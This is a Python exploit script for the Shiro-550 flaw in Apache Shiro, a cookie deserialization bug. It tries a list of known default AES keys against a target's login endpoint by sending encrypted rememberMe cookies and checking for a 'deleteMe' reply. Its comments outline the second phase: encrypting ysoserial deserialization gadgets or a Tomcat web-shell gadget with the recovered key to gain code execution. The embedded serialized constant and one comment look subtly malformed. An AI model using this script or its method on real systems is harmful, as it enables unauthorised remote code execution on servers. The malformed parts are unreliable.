#!/usr/bin/env python3
# [REFERENCE] Shiro-550 — rememberMe cookie deserialization (default/symmetric key).
# Fingerprint: Java app setting `rememberMe=deleteMe` on any response when probing
# login with rememberMe param. Phase 1 (this script): detect the AES key by encrypting
# a benign serialized SimplePrincipalCollection — if the server does NOT answer
# deleteMe, the key is correct (decryption succeeded). Phase 2: serialize a gadget
# (ysoserial CommonsBeanutils1/CommonsCollections* — no outbound needed with
# command-execution gadgets like CommonsCollections6 writing output into a header
# is NOT automatic: prefer a file-write/Tomcat-shell gadget or URLDNS-style
# confirmation first) and exploit.
# Usage: python3 shiro-550-rememberme-key-detect.py http://TARGET/login
import requests, sys, subprocess, base64, os, tempfile, urllib3
urllib3.disable_warnings()

BASE = sys.argv[1] if len(sys.argv) > 1 else "http://localhost/login"

# benign serialized object: shiro SimplePrincipalCollection (present on classpath by
# definition). Generating it needs no shiro jar for detection purposes: ANY correctly
# AES-CBC-encrypted valid shiro stream works; the standard trick ships the
# SimplePrincipalCollection bytes. Generate once with java if available, else use a
# known-good constant captured from a public lab (kept short here).
SPC_B64 = "rO0ABXNyADJvcmcuYXBhY2hlLnNoaXJvLnN1YmplY3QuU2ltcGxlUHJpbmNpcGFsQ29sbGVjdGlvbnqh/WCXFeowCAAFMAAFyZXRzdABMTGphdmEvdXRpbC9SZXN0O0wACnByaW5jaXBhbHN0AA9MamF2YS91dGlsL0xpc3Q7eHBwdwQAAAABc3IABGphdmEudXRpbC5MaXN0eA=="

KEYS = [
    "kPH+bIxk5D2deZiIxcaaaA==", "wGiHplamyXlVB11UXWol8g==", "2AvVhdsgUs0FSA3SDFAdag==",
    "Z3VucwAAAAAAAAAAAAAAAA==", "fCq+/xW488hMTCD+cmJ3aQ==", "1QVxUhjA/8vBO7yQ+tbKfA==",
    "WcfHGU0ROdyN5WU4cLbHug==", "bWluZS1hcHAta2V5LSoqKio=", "ZUdsaGJuSmxibVI2ZHc9PQ==",
    "L7RioUULEFhRyxDTkYWSUg==", "5aaC5qKm5oqA5pyvAAAAAA==", "bXRvbnMAAAAAAAAAAAAAAAA=",
    "a2VlcE9uR29pbmdBbnlEaXN0aQ==", "WctBUz+e5sZhafUKvglXPg==", "c2hpcm8AAAAAAAAAAAAAAAA=",
]

from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

def enc(key_b64, payload):
    key = base64.b64decode(key_b64)
    iv = os.urandom(16)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    ct = cipher.encrypt(pad(base64.b64decode(payload), 16))
    return base64.b64encode(iv + ct).decode()

payload = SPC_B64
found = []
for kb in KEYS:
    try:
        cookie = enc(kb, payload)
    except Exception:
        continue
    r = requests.get(BASE, cookies={"rememberMe": cookie}, verify=False, timeout=10,
                     allow_redirects=False)
    hdr = (r.headers.get("set-cookie") or "").lower()
    ok = "deleteme" not in hdr
    print("%s %-28s -> %s deleteMe=%s" % ("KEY " if ok else "    ", kb, r.status_code, "deleteme" in hdr))
    if ok:
        found.append(kb)

print("candidate keys:", found or "none of the common list")
# If a key hits: re-encrypt a real gadget with the SAME key (CBC with fresh IV) and
# fire at the login endpoint. If none: key is custom — move on (do NOT brute keys).
